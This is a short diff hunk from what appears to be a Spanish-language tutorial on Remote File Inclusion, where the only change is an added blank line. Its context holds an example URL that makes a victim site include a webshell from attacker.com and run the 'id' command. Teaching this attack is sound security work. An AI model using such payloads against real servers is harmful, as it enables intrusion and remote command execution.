@@ -71,6 +71,7 @@ La URL para incluir la webshell en el servidor víctima podría verse algo así:
 ``
 http://victimsite.com/index.php?file=http://attacker.com/shell.php&cmd=id
 ``
+
 ![img5](../../../assets/images/remote-file-inclusion-rfi-web/rcc.png)
    
 Estamos ejecutando comandos localmente usando un archivo remoto. Esto es básicamente un Remote File Inclusion.
